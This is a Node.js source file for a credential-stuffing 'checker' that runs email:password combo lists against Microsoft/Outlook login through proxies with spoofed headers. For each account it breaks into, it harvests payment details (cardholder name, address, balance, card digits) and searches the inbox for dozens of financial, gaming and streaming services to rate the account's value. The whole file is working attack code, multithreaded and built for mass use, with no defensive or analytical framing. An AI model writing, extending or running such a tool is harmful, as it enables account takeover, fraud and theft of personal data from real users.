// ============================================================
//  Microsoft Inbox AIO Checker — Node.js port of hotmail_checker.py
//  Logs into Hotmail/Outlook, searches inbox for 50+ services
// ============================================================

const { proxiedFetch } = require("./proxy-manager");

// ── Service definitions ─────────────────────────────────────
// Each service: { keyword, label, category }
const SERVICES = [
  // Streaming
  { keyword: "netflix", label: "Netflix", category: "Streaming" },
  { keyword: "disney+", label: "Disney+", category: "Streaming" },
  { keyword: "hulu", label: "Hulu", category: "Streaming" },
  { keyword: "hbo max", label: "HBO Max", category: "Streaming" },
  { keyword: "amazon prime", label: "Amazon Prime", category: "Streaming" },
  { keyword: "paramount+", label: "Paramount+", category: "Streaming" },
  { keyword: "peacock", label: "Peacock", category: "Streaming" },
  { keyword: "apple tv", label: "Apple TV+", category: "Streaming" },
  { keyword: "crunchyroll", label: "Crunchyroll", category: "Streaming" },
  { keyword: "funimation", label: "Funimation", category: "Streaming" },
  { keyword: "youtube premium", label: "YouTube Premium", category: "Streaming" },
  { keyword: "dazn", label: "DAZN", category: "Streaming" },

  // Music
  { keyword: "spotify", label: "Spotify", category: "Music" },
  { keyword: "apple music", label: "Apple Music", category: "Music" },
  { keyword: "tidal", label: "Tidal", category: "Music" },
  { keyword: "deezer", label: "Deezer", category: "Music" },
  { keyword: "soundcloud", label: "SoundCloud", category: "Music" },

  // Gaming
  { keyword: "roblox", label: "Roblox", category: "Gaming" },
  { keyword: "steam", label: "Steam", category: "Gaming" },
  { keyword: "epic games", label: "Epic Games", category: "Gaming" },
  { keyword: "riot games", label: "Riot Games", category: "Gaming" },
  { keyword: "playstation", label: "PlayStation", category: "Gaming" },
  { keyword: "xbox", label: "Xbox", category: "Gaming" },
  { keyword: "ea.com", label: "EA", category: "Gaming" },
  { keyword: "ubisoft", label: "Ubisoft", category: "Gaming" },
  { keyword: "activision", label: "Activision", category: "Gaming" },
  { keyword: "minecraft", label: "Minecraft", category: "Gaming" },

  // Shopping
  { keyword: "paypal", label: "PayPal", category: "Shopping" },
  { keyword: "amazon.com", label: "Amazon", category: "Shopping" },
  { keyword: "ebay", label: "eBay", category: "Shopping" },
  { keyword: "walmart", label: "Walmart", category: "Shopping" },
  { keyword: "shopify", label: "Shopify", category: "Shopping" },
  { keyword: "aliexpress", label: "AliExpress", category: "Shopping" },
  { keyword: "stripe", label: "Stripe", category: "Shopping" },
  { keyword: "cash app", label: "Cash App", category: "Shopping" },
  { keyword: "venmo", label: "Venmo", category: "Shopping" },

  // Social
  { keyword: "facebook", label: "Facebook", category: "Social" },
  { keyword: "instagram", label: "Instagram", category: "Social" },
  { keyword: "twitter", label: "Twitter/X", category: "Social" },
  { keyword: "tiktok", label: "TikTok", category: "Social" },
  { keyword: "snapchat", label: "Snapchat", category: "Social" },
  { keyword: "discord", label: "Discord", category: "Social" },
  { keyword: "telegram", label: "Telegram", category: "Social" },
  { keyword: "reddit", label: "Reddit", category: "Social" },
  { keyword: "linkedin", label: "LinkedIn", category: "Social" },

  // Cloud / Tools
  { keyword: "dropbox", label: "Dropbox", category: "Cloud" },
  { keyword: "google drive", label: "Google Drive", category: "Cloud" },
  { keyword: "icloud", label: "iCloud", category: "Cloud" },
  { keyword: "notion", label: "Notion", category: "Cloud" },
  { keyword: "zoom", label: "Zoom", category: "Cloud" },
  { keyword: "canva", label: "Canva", category: "Cloud" },
  { keyword: "adobe", label: "Adobe", category: "Cloud" },
  { keyword: "github", label: "GitHub", category: "Cloud" },

  // Crypto
  { keyword: "coinbase", label: "Coinbase", category: "Crypto" },
  { keyword: "binance", label: "Binance", category: "Crypto" },
  { keyword: "crypto.com", label: "Crypto.com", category: "Crypto" },
  { keyword: "kraken", label: "Kraken", category: "Crypto" },
];

const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
const MAX_RETRIES = 3;
const RETRY_DELAY = 2000;

const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";

const LOGIN_HEADERS = {
  "Host": "login.live.com",
  "Connection": "keep-alive",
  "Cache-Control": "max-age=0",
  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "Upgrade-Insecure-Requests": "1",
  "Origin": "https://login.live.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": USER_AGENT,
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
};

// ── Helpers ──────────────────────────────────────────────────

function parseLR(text, left, right) {
  try {
    const start = text.indexOf(left);
    if (start === -1) return "";
    const begin = start + left.length;
    const end = text.indexOf(right, begin);
    if (end === -1) return "";
    return text.substring(begin, end);
  } catch { return ""; }
}

function findNestedValues(obj, key) {
  const out = [];
  if (obj && typeof obj === "object") {
    if (Array.isArray(obj)) {
      for (const item of obj) out.push(...findNestedValues(item, key));
    } else {
      for (const [k, v] of Object.entries(obj)) {
        if (k.toLowerCase() === key.toLowerCase()) out.push(v);
        out.push(...findNestedValues(v, key));
      }
    }
  }
  return out;
}

function extractTotalMessages(searchJson, rawText) {
  const totals = [];
  for (const val of findNestedValues(searchJson, "Total")) {
    const n = parseInt(String(val).trim(), 10);
    if (!isNaN(n)) totals.push(n);
  }
  if (totals.length > 0) return Math.max(...totals);
  const t = parseLR(rawText, '"Total":', ",");
  if (t) { const n = parseInt(t.trim(), 10); if (!isNaN(n)) return n; }
  return 0;
}

function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── Cookie jar (simple Map-based) ───────────────────────────

function createCookieJar() {
  const jar = new Map();
  return {
    set(name, value) { jar.set(name, value); },
    get(name) { return jar.get(name); },
    toString() {
      return [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
    },
    parseFromHeaders(headers) {
      const setCookie = headers.getSetCookie?.() || [];
      for (const c of setCookie) {
        const parts = c.split(";")[0].split("=");
        if (parts.length >= 2) {
          jar.set(parts[0].trim(), parts.slice(1).join("=").trim());
        }
      }
    },
    has(search) {
      const str = this.toString();
      return str.includes(search);
    },
  };
}

// ── Single account check ────────────────────────────────────

async function attemptCheck(email, password) {
  const result = {
    user: email,
    password,
    status: "fail",
    captures: {},
    services: {}, // { serviceName: { found: bool, count: number, snippet: string, date: string } }
    detail: "",
  };

  const cookieJar = createCookieJar();

  try {
    // ── Step 1: Login ──
    const postData = new URLSearchParams({
      ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
      canary: "", ctx: "", hpgrequestid: "",
      PPFT: "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$",
      PPSX: "PassportRN", NewUser: "1", FoundMSAs: "",
      fspost: "0", i21: "0", CookieDisclosure: "0",
      IsFidoSupported: "1", isSignupPost: "0", isRecoveryAttemptPost: "0",
      i13: "1", login: email, loginfmt: email,
      type: "11", LoginOptions: "1", lrt: "", lrtPartition: "",
      hisRegion: "", hisScaleUnit: "", passwd: password,
    });

    const resp = await proxiedFetch(LOGIN_URL, {
      method: "POST",
      headers: { ...LOGIN_HEADERS, Cookie: cookieJar.toString() },
      body: postData.toString(),
      redirect: "follow",
      signal: AbortSignal.timeout(20000),
    });

    const body = await resp.text();
    const finalUrl = resp.url;
    cookieJar.parseFromHeaders(resp.headers);

    // Status detection
    if ([
      "Your account or password is incorrect",
      "That Microsoft account doesn\\'t exist",
      "That Microsoft account doesn't exist",
      "Sign in to your Microsoft account",
      "timed out",
    ].some(x => body.includes(x))) {
      result.status = "fail";
      result.detail = "bad credentials";
      return result;
    }

    if (body.includes(",AC:null,urlFedConvertRename")) {
      result.status = "retry";
      result.detail = "ban/rate limit";
      return result;
    }

    if (["account.live.com/recover?mkt", "recover?mkt",
         "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"
    ].some(x => body.includes(x))) {
      result.status = "2fa";
      result.detail = "2FA/recovery";
      return result;
    }

    if (body.includes("/cancel?mkt=") || body.includes("/Abuse?mkt=")) {
      result.status = "locked";
      result.detail = "locked/abuse";
      return result;
    }

    const cookieStr = cookieJar.toString();
    if ((cookieStr.includes("ANON") || cookieStr.includes("WLSSC")) &&
        finalUrl.includes("https://login.live.com/oauth20_desktop.srf?")) {
      result.status = "hit";
    } else {
      result.status = "fail";
      result.detail = "login failed";
      return result;
    }

    // ── Step 2: Get substrate access token ──
    let accessToken = "";
    let refreshToken = parseLR(finalUrl, "refresh_token=", "&");
    if (!refreshToken) refreshToken = parseLR(body, "refresh_token=", "&");

    if (refreshToken) {
      try {
        const tokenData = new URLSearchParams({
          grant_type: "refresh_token",
          client_id: "0000000048170EF2",
          scope: "https://substrate.office.com/User-Internal.ReadWrite",
          redirect_uri: "https://login.live.com/oauth20_desktop.srf",
          refresh_token: refreshToken,
          uaid: "db28da170f2a4b85a26388d0a6cdbb6e",
        });

        const tokenResp = await proxiedFetch("https://login.live.com/oauth20_token.srf", {
          method: "POST",
          body: tokenData.toString(),
          headers: {
            "x-ms-sso-Ignore-SSO": "1",
            "User-Agent": "Outlook-Android/2.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "login.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
          },
          signal: AbortSignal.timeout(15000),
        });
        const tokenJson = await tokenResp.json();
        accessToken = tokenJson.access_token || "";
      } catch {}
    }

    // ── Step 3: Get PIFD token for payment info ──
    let pifdToken = "";
    try {
      const pifdResp = await proxiedFetch(
        "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
        {
          headers: {
            "Host": "login.live.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
            "Referer": "https://account.microsoft.com/",
            Cookie: cookieJar.toString(),
          },
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        }
      );
      const pifdUrl = pifdResp.url;
      pifdToken = parseLR(pifdUrl, "access_token=", "&token_type") || parseLR(pifdUrl, "access_token=", "&");
      if (pifdToken) pifdToken = decodeURIComponent(pifdToken);
    } catch {}

    // ── Step 4: Payment instruments ──
    if (pifdToken) {
      try {
        const payResp = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
          {
            headers: {
              "User-Agent": USER_AGENT,
              "Pragma": "no-cache",
              "Accept": "application/json",
              "Accept-Language": "en-US,en;q=0.9",
              "Authorization": `MSADELEGATE1.0="${pifdToken}"`,
              "Content-Type": "application/json",
              "Origin": "https://account.microsoft.com",
              "Referer": "https://account.microsoft.com/",
            },
            signal: AbortSignal.timeout(15000),
          }
        );
        const payBody = await payResp.text();

        const name = parseLR(payBody, '"accountHolderName":"', '"');
        if (name) result.captures["Name"] = name;

        const addr1 = parseLR(payBody, '"address":{"address_line1":"', '"');
        const city = parseLR(payBody, '"city":"', '"');
        const region = parseLR(payBody, '"region":"', '"');
        const zipcode = parseLR(payBody, '"postal_code":"', '"');
        if (addr1 || city) result.captures["Address"] = `${addr1} | ${city} | ${region} | ${zipcode}`;

        const balance = parseLR(payBody, 'balance":', ',"');
        if (balance) result.captures["Balance"] = `$${balance}`;

        const last4 = parseLR(payBody, '"lastFourDigits":"', '",');
        const cardType = parseLR(payBody, '"cardType":"', '"');
        if (last4) result.captures["CC"] = `****${last4} (${cardType})`;
      } catch {}
    }

    // ── Step 5: Search inbox for ALL services ──
    const anchor = refreshToken ? `CID:${refreshToken}` : "";
    if (accessToken && accessToken.startsWith("Ew")) {
      const mailHeaders = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": `Bearer ${accessToken}`,
        "X-AnchorMailbox": anchor,
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
      };

      // Search each service
      for (const svc of SERVICES) {
        try {
          const searchBody = {
            Cvid: "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            Scenario: { Name: "owa.react" },
            TimeZone: "UTC",
            TextDecorations: "Off",
            EntityRequests: [{
              EntityType: "Conversation",
              ContentSources: ["Exchange"],
              Filter: {
                Or: [
                  { Term: { DistinguishedFolderName: "msgfolderroot" } },
                  { Term: { DistinguishedFolderName: "DeletedItems" } },
                ],
              },
              From: 0,
              Query: { QueryString: svc.keyword },
              RefiningQueries: null,
              Size: 25,
              Sort: [
                { Field: "Score", SortDirection: "Desc", Count: 3 },
                { Field: "Time", SortDirection: "Desc" },
              ],
              EnableTopResults: true,
              TopResultsCount: 3,
            }],
            AnswerEntityRequests: [{
              Query: { QueryString: svc.keyword },
              EntityTypes: ["Event", "File"],
              From: 0, Size: 10,
              EnableAsyncResolution: true,
            }],
            QueryAlterationOptions: {
              EnableSuggestion: true,
              EnableAlteration: true,
              SupportedRecourseDisplayTypes: [
                "Suggestion", "NoResultModification",
                "NoResultFolderRefinerModification",
                "NoRequeryModification", "Modification",
              ],
            },
            LogicalId: "446c567a-02d9-b739-b9ca-616e0d45905c",
          };

          const searchResp = await proxiedFetch(
            "https://outlook.live.com/search/api/v2/query?n=124",
            {
              method: "POST",
              body: JSON.stringify(searchBody),
              headers: { ...mailHeaders, "Content-Type": "application/json" },
              signal: AbortSignal.timeout(10000),
            }
          );

          const searchText = await searchResp.text();
          let searchJson = {};
          try { searchJson = JSON.parse(searchText); } catch {}

          const totalMsgs = extractTotalMessages(searchJson, searchText);

          if (totalMsgs > 0) {
            // Extract snippet
            let snippet = "";
            for (const key of ["HitHighlightedSummary", "Summary", "Preview", "Snippet"]) {
              const vals = findNestedValues(searchJson, key);
              for (const v of vals) {
                if (typeof v === "string" && v.trim()) { snippet = v.trim(); break; }
              }
              if (snippet) break;
            }
            if (snippet) snippet = snippet.replace(/\[.*?\]/g, "").trim().slice(0, 120);

            // Extract date
            let lastDate = "";
            for (const key of ["LastDeliveryTime", "ReceivedDateTime", "DateTimeSent"]) {
              const vals = findNestedValues(searchJson, key);
              for (const v of vals) {
                if (typeof v === "string" && v.trim()) { lastDate = v.trim(); break; }
              }
              if (lastDate) break;
            }
            if (lastDate && lastDate.includes("T")) lastDate = lastDate.split("T")[0];

            result.services[svc.label] = {
              found: true,
              count: totalMsgs,
              snippet: snippet || "",
              date: lastDate || "",
              category: svc.category,
            };
          }
        } catch {
          // Skip failed service search silently
        }
      }
    }

  } catch (err) {
    if (err.name === "TimeoutError" || err.message?.includes("timed out")) {
      result.status = "retry";
      result.detail = "timed out";
    } else if (err.message?.includes("fetch failed") || err.message?.includes("ECONNREFUSED")) {
      result.status = "retry";
      result.detail = "connection error";
    } else {
      result.status = "fail";
      result.detail = String(err).slice(0, 100);
    }
  }

  return result;
}

async function checkSingleAccount(email, password) {
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    const result = await attemptCheck(email, password);
    if (result.status === "retry") {
      if (attempt < MAX_RETRIES - 1) {
        await delay(RETRY_DELAY * (attempt + 1));
        continue;
      }
      result.status = "fail";
      result.detail = `retry exhausted (${result.detail})`;
    }
    return result;
  }
}

// ── Batch checker ───────────────────────────────────────────

async function checkInboxAccounts(accounts, threads = 5, onProgress, signal) {
  const results = [];
  let currentIndex = 0;
  let completed = 0;
  let hitCount = 0;
  let failCount = 0;

  async function worker() {
    while (true) {
      if (signal?.aborted) break;
      const idx = currentIndex++;
      if (idx >= accounts.length) break;

      const combo = accounts[idx];
      const parts = combo.split(":");
      if (parts.length < 2 || !parts[0].trim() || !parts[1].trim()) {
        results.push({
          user: parts[0]?.trim() || combo,
          password: parts[1]?.trim() || "",
          status: "fail",
          captures: {},
          services: {},
          detail: "invalid format",
        });
        completed++;
        continue;
      }

      const email = parts[0].trim();
      const password = parts.slice(1).join(":").trim();
      const r = await checkSingleAccount(email, password);
      results.push(r);
      completed++;

      if (r.status === "hit") hitCount++;
      else failCount++;

      if (onProgress) {
        try {
          onProgress(completed, accounts.length, r.status, hitCount, failCount, r);
        } catch {
          try { onProgress(completed, accounts.length); } catch {}
        }
      }
    }
  }

  const concurrency = Math.min(threads, 50);
  const workers = Array(Math.min(concurrency, accounts.length)).fill(null).map(() => worker());
  await Promise.all(workers);
  return results;
}

function getServiceList() {
  return SERVICES;
}

function getServiceCount() {
  return SERVICES.length;
}

module.exports = { checkInboxAccounts, getServiceList, getServiceCount, SERVICES };
